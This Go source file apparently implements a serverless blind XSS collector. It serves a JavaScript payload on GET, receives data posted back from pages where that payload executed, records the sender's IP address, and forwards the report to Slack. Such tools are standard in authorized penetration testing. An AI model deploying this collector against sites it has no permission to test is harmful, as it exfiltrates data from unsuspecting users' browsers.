// Package serverless allows you to run blindxss testing as a severless module
package serverless

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/cosmoscrew/thewidow/handlers/blindxss/core"
	"github.com/cosmoscrew/thewidow/outputs"
	"github.com/sirupsen/logrus"
)

// Handler handles the requests to endpoint
func Handler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		w.Header().Set("Content-Type", "application/javascript")
		fmt.Fprintf(w, "%s", strings.Replace(core.Payload, "{{host}}", fmt.Sprintf("https://%s", r.Host), -1))
	} else if r.Method == "POST" {
		data, err := ioutil.ReadAll(r.Body)
		if err != nil {
			logrus.WithError(err).Warning("Could not read body")
			return
		}
		r.Body.Close()

		body := string(data)
		go ProcessRequest(body, r.RemoteAddr)
	}
}

// ProcessRequest processes a single blind-xss request
func ProcessRequest(body string, RemoteAddr string) {
	q, err := url.ParseQuery(body)
	if err != nil {
		logrus.WithError(err).Warning("Could not parse query")
		return
	}

	values := make(map[string]string)
	for key := range q {
		dataDecoded, err := url.QueryUnescape(q.Get(key))
		if err != nil {
			logrus.WithError(err).Warning("Could not decode form field")
			return
		}
		values[key] = dataDecoded
	}
	values["ip"] = RemoteAddr

	message := core.NewReport(values)
	message.Print()
	outputs.SendNotificationToSlackDirect(message.String(), os.Getenv("SLACK_WEBHOOK"))
}
